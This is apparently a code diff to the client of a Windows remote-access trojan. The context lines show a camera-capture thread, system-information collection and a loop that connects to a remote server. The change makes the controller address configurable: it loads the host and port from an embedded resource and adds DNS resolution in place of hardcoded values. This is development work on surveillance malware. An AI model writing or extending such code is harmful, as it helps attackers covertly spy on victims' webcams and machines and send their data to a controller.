@@ -139,6 +139,9 @@ void camera_thread(void* arg) {
 int main() {
     WSADATA wsa;
     WSAStartup(MAKEWORD(2, 2), &wsa);
+
+    load_config_from_resource();
+
     g_send_mutex = CreateMutex(NULL, FALSE, NULL);
 
     char* info = collect_sysinfo();
@@ -147,8 +150,16 @@ int main() {
         g_sock = socket(AF_INET, SOCK_STREAM, 0);
         struct sockaddr_in server;
         server.sin_family = AF_INET;
-        server.sin_addr.s_addr = inet_addr(HOST);
-        server.sin_port = htons(PORT);
+
+        unsigned long addr = inet_addr(g_host);
+        if (addr == INADDR_NONE) {
+            struct hostent* he = gethostbyname(g_host);
+            if (he != NULL) {
+                addr = *(unsigned long*)he->h_addr_list[0];
+            }
+        }
+        server.sin_addr.s_addr = addr;
+        server.sin_port = htons(g_port);
 
         if (connect(g_sock, (struct sockaddr*)&server, sizeof(server)) < 0) {
             closesocket(g_sock);
